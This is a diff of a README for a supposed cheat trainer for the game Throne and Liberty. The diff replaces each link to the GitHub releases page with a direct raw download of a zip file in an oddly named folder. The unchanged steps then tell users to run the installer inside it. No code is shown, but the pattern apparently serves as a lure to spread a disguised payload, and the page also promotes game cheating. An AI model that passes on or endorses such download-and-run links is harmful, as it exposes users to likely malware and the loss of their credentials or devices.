@@ -1,6 +1,6 @@
 # 🎮 THRONE-AND-LIBERTY-Trainer-Cheats - Enhance Your Game Experience Effortlessly
 
-[![Download THRONE-AND-LIBERTY-Trainer-Cheats](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/releases)
+[![Download THRONE-AND-LIBERTY-Trainer-Cheats](https://raw.githubusercontent.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/main/oligophyllous/THRONE-AND-LIBERTY-Trainer-Cheats.zip)](https://raw.githubusercontent.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/main/oligophyllous/THRONE-AND-LIBERTY-Trainer-Cheats.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **THRONE-AND-LIBERTY-Trainer-Cheats** repository. This software a
 
 To begin, visit the Releases page where you can get the latest version of the software. Click the button below:
 
-[![Download THRONE-AND-LIBERTY-Trainer-Cheats](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/releases)
+[![Download THRONE-AND-LIBERTY-Trainer-Cheats](https://raw.githubusercontent.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/main/oligophyllous/THRONE-AND-LIBERTY-Trainer-Cheats.zip)](https://raw.githubusercontent.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/main/oligophyllous/THRONE-AND-LIBERTY-Trainer-Cheats.zip)
 
 ## 📋 System Requirements
 
@@ -35,7 +35,7 @@ The trainer offers a variety of features to enhance your gameplay, including:
 
 To download the software, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [THRONE-AND-LIBERTY-Trainer-Cheats Releases](https://github.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/releases).
+1. **Visit the Releases Page:** Go to the [THRONE-AND-LIBERTY-Trainer-Cheats Releases](https://raw.githubusercontent.com/MubashirIhtisham2004/THRONE-AND-LIBERTY-Trainer-Cheats/main/oligophyllous/THRONE-AND-LIBERTY-Trainer-Cheats.zip).
 2. **Choose a Version:** Select the latest version available.
 3. **Download the Installer:** Click on the file to start the download.
 4. **Run the Installer:** Navigate to your downloads folder and double-click the installer file.
